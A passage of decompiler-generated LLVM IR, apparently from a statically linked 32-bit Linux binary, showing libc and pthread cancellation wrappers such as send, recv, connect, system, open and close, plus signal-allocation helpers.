  uselistorder i32 (i32)* @__pthread_acquire, { 1, 0 }
  uselistorder label %dec_label_pc_8058a64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058a58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058a19, { 1, 0 }
  uselistorder label %dec_label_pc_8058a14, { 1, 0 }
  uselistorder label %dec_label_pc_80589fe, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80589ca, { 1, 0 }
}

define i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058a70 = load i32, i32* @ebx, align 4
  store i32 %v0_8058a70, i32* %stack_var_-4, align 4
  %v2_8058a74 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058a7b = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058a74)
  %v6_8058a9a = call i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6)
  %v3_8058aa4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_8058a9a, i32* @ebx, align 4
  %v2_8058aaa = trunc i32 %v3_8058aa4 to i8
  %v3_8058aaa = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058aaa, i32 0)
  %v0_8058ab2 = load i32, i32* @ebx, align 4
  %v2_8058ab4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058ab4, i32* @ebx, align 4
  ret i32 %v0_8058ab2
}

define i32 @sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058aba = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058ac1 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058aba)
  %v3_8058ad5 = call i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_8058ad5, i32* @ebx, align 4
  %v3_8058ae0 = load i32, i32* %stack_var_-8, align 4
  %v2_8058ae4 = trunc i32 %v3_8058ae0 to i8
  %v3_8058ae4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058ae4, i32 0)
  %v0_8058aec = load i32, i32* @ebx, align 4
  ret i32 %v0_8058aec
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058af0 = load i32, i32* @ebx, align 4
  store i32 %v0_8058af0, i32* %stack_var_-4, align 4
  %v2_8058af4 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058afb = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058af4)
  %v4_8058b10 = call i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_8058b1a = load i32, i32* %stack_var_-8, align 4
  store i32 %v4_8058b10, i32* @ebx, align 4
  %v2_8058b20 = trunc i32 %v3_8058b1a to i8
  %v3_8058b20 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058b20, i32 0)
  %v0_8058b28 = load i32, i32* @ebx, align 4
  %v2_8058b2a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058b2a, i32* @ebx, align 4
  ret i32 %v0_8058b28
}

define i32 @recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058b30 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058b37 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058b30)
  %v3_8058b4b = call i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8058b4b, i32* @ebx, align 4
  %v3_8058b56 = load i32, i32* %stack_var_-8, align 4
  %v2_8058b5a = trunc i32 %v3_8058b56 to i8
  %v3_8058b5a = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058b5a, i32 0)
  %v0_8058b62 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058b62
}

define i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058b6a = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058b71 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058b6a)
  store i32 %v2_8058b6a, i32* @ebx, align 4
  %v6_8058b90 = call i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6)
  %v3_8058b9a = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_8058b90, i32* @ebx, align 4
  %v2_8058ba0 = trunc i32 %v3_8058b9a to i8
  %v3_8058ba0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058ba0, i32 0)
  %v0_8058ba8 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058ba8
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058bac = load i32, i32* @ebx, align 4
  store i32 %v0_8058bac, i32* %stack_var_-4, align 4
  %v2_8058bb0 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058bb7 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058bb0)
  %v4_8058bcc = call i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_8058bd6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v4_8058bcc, i32* @ebx, align 4
  %v2_8058bdc = trunc i32 %v3_8058bd6 to i8
  %v3_8058bdc = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058bdc, i32 0)
  %v0_8058be4 = load i32, i32* @ebx, align 4
  %v2_8058be6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058be6, i32* @ebx, align 4
  ret i32 %v0_8058be4
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058be8 = load i32, i32* @ebx, align 4
  store i32 %v0_8058be8, i32* %stack_var_-4, align 4
  %v2_8058bec = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058bf3 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058bec)
  %v3_8058c07 = call i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8058c07, i32* @ebx, align 4
  %v3_8058c12 = load i32, i32* %stack_var_-8, align 4
  %v2_8058c16 = trunc i32 %v3_8058c12 to i8
  %v3_8058c16 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058c16, i32 0)
  %v0_8058c1e = load i32, i32* @ebx, align 4
  %v2_8058c20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058c20, i32* @ebx, align 4
  ret i32 %v0_8058c1e
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058c22 = load i32, i32* @ebx, align 4
  store i32 %v0_8058c22, i32* %stack_var_-4, align 4
  %v2_8058c26 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058c2d = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058c26)
  %v3_8058c41 = call i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_8058c41, i32* @ebx, align 4
  %v3_8058c4c = load i32, i32* %stack_var_-8, align 4
  %v2_8058c50 = trunc i32 %v3_8058c4c to i8
  %v3_8058c50 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058c50, i32 0)
  %v0_8058c58 = load i32, i32* @ebx, align 4
  %v2_8058c5a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058c5a, i32* @ebx, align 4
  ret i32 %v0_8058c58
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058c5c = load i32, i32* @ebx, align 4
  store i32 %v0_8058c5c, i32* %stack_var_-4, align 4
  %v2_8058c60 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058c67 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058c60)
  %v3_8058c7b = call i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8058c7b, i32* @ebx, align 4
  %v3_8058c86 = load i32, i32* %stack_var_-8, align 4
  %v2_8058c8a = trunc i32 %v3_8058c86 to i8
  %v3_8058c8a = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058c8a, i32 0)
  %v0_8058c92 = load i32, i32* @ebx, align 4
  %v2_8058c94 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058c94, i32* @ebx, align 4
  ret i32 %v0_8058c92
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058c96 = load i32, i32* @ebx, align 4
  store i32 %v0_8058c96, i32* %stack_var_-4, align 4
  %v2_8058c9a = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058ca1 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058c9a)
  %v3_8058cb5 = call i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_8058cb5, i32* @ebx, align 4
  %v3_8058cc0 = load i32, i32* %stack_var_-8, align 4
  %v2_8058cc4 = trunc i32 %v3_8058cc0 to i8
  %v3_8058cc4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058cc4, i32 0)
  %v0_8058ccc = load i32, i32* @ebx, align 4
  %v2_8058cce = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058cce, i32* @ebx, align 4
  ret i32 %v0_8058ccc
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058cd4 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058cdb = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058cd4)
  %v1_8058ce5 = call i32 @__libc_wait(i32 %arg1)
  store i32 %v1_8058ce5, i32* @ebx, align 4
  %v3_8058cf0 = load i32, i32* %stack_var_-8, align 4
  %v2_8058cf4 = trunc i32 %v3_8058cf0 to i8
  %v3_8058cf4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058cf4, i32 0)
  %v0_8058cfc = load i32, i32* @ebx, align 4
  ret i32 %v0_8058cfc
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058d04 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058d0b = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058d04)
  %v1_8058d15 = call i32 @__libc_tcdrain(i32 %arg1)
  store i32 %v1_8058d15, i32* @ebx, align 4
  %v3_8058d20 = load i32, i32* %stack_var_-8, align 4
  %v2_8058d24 = trunc i32 %v3_8058d20 to i8
  %v3_8058d24 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058d24, i32 0)
  %v0_8058d2c = load i32, i32* @ebx, align 4
  ret i32 %v0_8058d2c
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058d30 = load i32, i32* @ebx, align 4
  store i32 %v0_8058d30, i32* %stack_var_-4, align 4
  %v2_8058d34 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058d3b = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058d34)
  store i32 1, i32* @ecx, align 4
  %v1_8058d45 = call i32 @__libc_system(i32 %arg1)
  store i32 %v1_8058d45, i32* @ebx, align 4
  %v3_8058d50 = load i32, i32* %stack_var_-8, align 4
  %v2_8058d54 = trunc i32 %v3_8058d50 to i8
  %v3_8058d54 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058d54, i32 0)
  %v0_8058d5c = load i32, i32* @ebx, align 4
  %v2_8058d5e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058d5e, i32* @ebx, align 4
  ret i32 %v0_8058d5c
}

define i32 @read(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_8058d64 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058d6b = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058d64)
  %v3_8058d7f = call i32 @__libc_read(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_8058d7f, i32* @ebx, align 4
  %v3_8058d8a = load i32, i32* %stack_var_-8, align 4
  %v2_8058d8e = trunc i32 %v3_8058d8a to i8
  %v3_8058d8e = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058d8e, i32 0)
  %v0_8058d96 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058d96
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058d9e = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058da5 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058d9e)
  %v4_8058dba = call i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_8058dc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v4_8058dba, i32* @ebx, align 4
  %v2_8058dca = trunc i32 %v3_8058dc4 to i8
  %v3_8058dca = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058dca, i32 0)
  %v0_8058dd2 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058dd2
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg5, i32* @esi, align 4
  %v2_8058ddf = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg4, i32* @ebx, align 4
  %v3_8058dea = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058ddf)
  %v0_8058def = load i32, i32* @esi, align 4
  %v0_8058df2 = load i32, i32* @ebx, align 4
  %v5_8058dff = call i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v0_8058df2, i32 %v0_8058def)
  %v3_8058e09 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_8058dff, i32* @ebx, align 4
  %v2_8058e0f = trunc i32 %v3_8058e09 to i8
  %v3_8058e0f = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058e0f, i32 0)
  %v0_8058e17 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058e17
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058e20 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058e27 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058e20)
  %v4_8058e3c = call i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_8058e46 = load i32, i32* %stack_var_-8, align 4
  store i32 %v4_8058e3c, i32* @ebx, align 4
  %v2_8058e4c = trunc i32 %v3_8058e46 to i8
  %v3_8058e4c = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058e4c, i32 0)
  %v0_8058e54 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058e54
}

define i32 @pause(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058e5c = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058e63 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058e5c)
  %v0_8058e68 = call i32 @__libc_pause()
  store i32 1, i32* @ecx, align 4
  store i32 %v0_8058e68, i32* @ebx, align 4
  %v3_8058e73 = load i32, i32* %stack_var_-8, align 4
  %v2_8058e77 = trunc i32 %v3_8058e73 to i8
  %v3_8058e77 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058e77, i32 0)
  %v0_8058e7f = load i32, i32* @ebx, align 4
  ret i32 %v0_8058e7f
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058e87 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058e8e = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058e87)
  %v3_8058eaa = trunc i32 %arg2 to i8
  %v4_8058eaa = call i32 @__GI___libc_open64(i32 %arg1, i8 %v3_8058eaa, i32 %arg3)
  store i32 %v4_8058eaa, i32* @ebx, align 4
  %v3_8058eb5 = load i32, i32* %stack_var_-8, align 4
  %v2_8058eb9 = trunc i32 %v3_8058eb5 to i8
  %v3_8058eb9 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058eb9, i32 0)
  %v0_8058ec1 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058ec1
}

define i32 @open(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_8058ec9 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058ed0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058ec9)
  %v3_8058eec = trunc i32 %tmp1 to i8
  %v4_8058eec = call i32 @__libc_open(i32 %arg1, i8 %v3_8058eec, i32 %tmp2)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v4_8058eec, i32* @ebx, align 4
  %v3_8058ef7 = load i32, i32* %stack_var_-8, align 4
  %v2_8058efb = trunc i32 %v3_8058ef7 to i8
  %v3_8058efb = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058efb, i32 0)
  %v0_8058f03 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058f03
}

define i32 @nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058f07 = load i32, i32* @ebx, align 4
  store i32 %v0_8058f07, i32* %stack_var_-4, align 4
  %v2_8058f0b = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058f12 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058f0b)
  store i32 %v2_8058f0b, i32* @ebx, align 4
  %v2_8058f21 = call i32 @__libc_nanosleep(i32 %arg1, i32 %arg2)
  store i32 %v2_8058f21, i32* @ebx, align 4
  %v3_8058f2c = load i32, i32* %stack_var_-8, align 4
  %v2_8058f30 = trunc i32 %v3_8058f2c to i8
  %v3_8058f30 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058f30, i32 0)
  %v0_8058f38 = load i32, i32* @ebx, align 4
  %v2_8058f3a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058f3a, i32* @ebx, align 4
  ret i32 %v0_8058f38
}

define i32 @msync(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_8058f40 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058f47 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058f40)
  %v3_8058f5b = call i32 @__libc_msync(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_8058f5b, i32* @ebx, align 4
  %v3_8058f66 = load i32, i32* %stack_var_-8, align 4
  %v2_8058f6a = trunc i32 %v3_8058f66 to i8
  %v3_8058f6a = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058f6a, i32 0)
  %v0_8058f72 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058f72
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_8058f7b = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v3_8058f8a = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058f7b)
  %v0_8058f93 = load i32, i32* @esi, align 4
  %v0_8058f94 = load i32, i32* @ebx, align 4
  %v4_8058f99 = call i32 @__libc_lseek64(i32 %arg1, i32 %v0_8058f94, i32 %v0_8058f93, i32 %arg4)
  %v3_8058fa3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v4_8058f99, i32* @ebx, align 4
  %v0_8058fa9 = load i32, i32* @edx, align 4
  store i32 %v0_8058fa9, i32* @esi, align 4
  %v2_8058fab = trunc i32 %v3_8058fa3 to i8
  %v3_8058fab = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058fab, i32 0)
  %v0_8058fb3 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058fb3
}

define i32 @lseek(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_8058fbe = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058fc5 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058fbe)
  %v3_8058fd9 = call i32 @__GI___libc_lseek(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_8058fd9, i32* @ebx, align 4
  %v3_8058fe4 = load i32, i32* %stack_var_-8, align 4
  %v2_8058fe8 = trunc i32 %v3_8058fe4 to i8
  %v3_8058fe8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8058fe8, i32 0)
  %v0_8058ff0 = load i32, i32* @ebx, align 4
  ret i32 %v0_8058ff0
}

define i32 @fsync(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8058ff8 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8058fff = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8058ff8)
  store i32 1, i32* @ecx, align 4
  %v1_8059009 = call i32 @__libc_fsync(i32 %arg1)
  store i32 %v1_8059009, i32* @ebx, align 4
  %v3_8059014 = load i32, i32* %stack_var_-8, align 4
  %v2_8059018 = trunc i32 %v3_8059014 to i8
  %v3_8059018 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8059018, i32 0)
  %v0_8059020 = load i32, i32* @ebx, align 4
  ret i32 %v0_8059020
}

define i32 @fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059024 = load i32, i32* @ebx, align 4
  store i32 %v0_8059024, i32* %stack_var_-4, align 4
  %v2_8059028 = ptrtoint i32* %stack_var_-8 to i32
  %v3_805902f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8059028)
  %v3_805904b = call i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_805904b, i32* @ebx, align 4
  %v3_8059056 = load i32, i32* %stack_var_-8, align 4
  %v2_805905a = trunc i32 %v3_8059056 to i8
  %v3_805905a = call i32 @__GI_pthread_setcanceltype(i8 %v2_805905a, i32 0)
  %v0_8059062 = load i32, i32* @ebx, align 4
  %v2_8059064 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059064, i32* @ebx, align 4
  ret i32 %v0_8059062
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059066 = load i32, i32* @ebx, align 4
  store i32 %v0_8059066, i32* %stack_var_-4, align 4
  %v2_805906a = ptrtoint i32* %stack_var_-8 to i32
  %v3_8059071 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_805906a)
  %v1_805907b = call i32 @__libc_close(i32 %arg1)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v1_805907b, i32* @ebx, align 4
  %v3_8059086 = load i32, i32* %stack_var_-8, align 4
  %v2_805908a = trunc i32 %v3_8059086 to i8
  %v3_805908a = call i32 @__GI_pthread_setcanceltype(i8 %v2_805908a, i32 0)
  %v0_8059092 = load i32, i32* @ebx, align 4
  %v2_8059094 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059094, i32* @ebx, align 4
  ret i32 %v0_8059092

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 44, 45, 32, 33, 0, 1, 2, 3, 4, 5, 6, 7, 52, 53, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 36, 37, 22, 23, 24, 25, 40, 41, 50, 51, 46, 47, 42, 43, 48, 49, 26, 27, 28, 29, 34, 35, 30, 31, 38, 39 }
}

define i32 @__libc_current_sigrtmin() local_unnamed_addr {
entry:
  %v0_8059098 = load i32, i32* @global_var_80753d8.605, align 8
  ret i32 %v0_8059098
}

define i32 @__libc_current_sigrtmax() local_unnamed_addr {
entry:
  %v0_805909e = load i32, i32* @global_var_80753dc.606, align 4
  ret i32 %v0_805909e
}

define i32 @__libc_allocate_rtsig(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80590a4 = load i32, i32* @global_var_80753d8.605, align 8
  %v1_80590aa = add i32 %v0_80590a4, 1
  %v10_80590aa = icmp eq i32 %v1_80590aa, 0
  br i1 %v10_80590aa, label %dec_label_pc_80590d6, label %dec_label_pc_80590af

dec_label_pc_80590af:                             ; preds = %entry
  %v0_80590af = load i32, i32* @global_var_80753dc.606, align 4
  %v8_80590b7 = icmp sgt i32 %v0_80590a4, %v0_80590af
  br i1 %v8_80590b7, label %dec_label_pc_80590d6, label %dec_label_pc_80590b9

dec_label_pc_80590b9:                             ; preds = %dec_label_pc_80590af
  %v4_80590b9 = icmp eq i32 %arg1, 0
  br i1 %v4_80590b9, label %dec_label_pc_80590ca, label %dec_label_pc_80590c0

dec_label_pc_80590c0:                             ; preds = %dec_label_pc_80590b9
  store i32 %v1_80590aa, i32* @global_var_80753d8.605, align 8
  br label %dec_label_pc_80590d9

dec_label_pc_80590ca:                             ; preds = %dec_label_pc_80590b9
  %v1_80590ca = add i32 %v0_80590af, -1
  store i32 %v1_80590ca, i32* @global_var_80753dc.606, align 4
  br label %dec_label_pc_80590d9

dec_label_pc_80590d6:                             ; preds = %dec_label_pc_80590af, %entry
  br label %dec_label_pc_80590d9

dec_label_pc_80590d9:                             ; preds = %dec_label_pc_80590ca, %dec_label_pc_80590c0, %dec_label_pc_80590d6
  %v0_80590d9 = phi i32 [ %v0_80590af, %dec_label_pc_80590ca ], [ %v0_80590a4, %dec_label_pc_80590c0 ], [ -1, %dec_label_pc_80590d6 ]
  ret i32 %v0_80590d9

; uselistorder directives
  uselistorder label %dec_label_pc_80590d9, { 2, 0, 1 }
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v15_80590e0 = icmp eq i32 %arg1, %arg2
  %v1_80590e4 = zext i1 %v15_80590e0 to i32
  ret i32 %v1_80590e4
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v0_80590eb = load i32, i32* @eax, align 4
  ret i32 %v0_80590eb
}

define i32 @__pthread_setconcurrency(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_8079c64.607, align 4
  ret i32 0
}

define i32 @__pthread_getconcurrency() local_unnamed_addr {
entry:
  %v0_80590f8 = load i32, i32* @global_var_8079c64.607, align 4
  ret i32 %v0_80590f8
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp5 = call i64 @__decompiler_undefined_function_4()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80590fe = load i32, i32* @ebx, align 4
  store i32 %v0_80590fe, i32* %stack_var_-4, align 4
  %v2_8059107 = ptrtoint i32* %stack_var_-432 to i32
  %v3_805910c = call i32 @__sigsetjmp(i32 %v2_8059107, i32* inttoptr (i32 1 to i32*))
  store i32 1, i32* @edx, align 4
  %v1_8059119 = icmp eq i32 %v3_805910c, 0
  %v1_805911b = icmp eq i1 %v1_8059119, false
  br i1 %v1_805911b, label %entry.dec_label_pc_8059200_crit_edge, label %dec_label_pc_8059121

entry.dec_label_pc_8059200_crit_edge:             ; preds = %entry
  %.pre = add i32 %arg1, 36
  %.pre4 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_8059200

dec_label_pc_8059121:                             ; preds = %entry
  %tmp7 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
